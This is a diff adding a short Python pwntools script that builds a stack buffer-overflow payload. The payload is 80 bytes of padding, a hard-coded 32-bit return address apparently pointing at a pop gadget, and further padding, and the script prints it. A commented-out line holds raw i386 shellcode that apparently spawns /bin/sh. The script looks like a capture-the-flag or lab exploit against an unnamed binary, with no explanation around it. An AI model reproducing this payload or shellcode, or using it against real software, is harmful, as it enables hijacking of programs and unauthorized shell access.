@@ -1,0 +1,6 @@
+from pwn import *
+offset = "A"*80
+pop = p32(0x08048493)
+padding = "B"*8
+#shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
+print offset + pop +padding
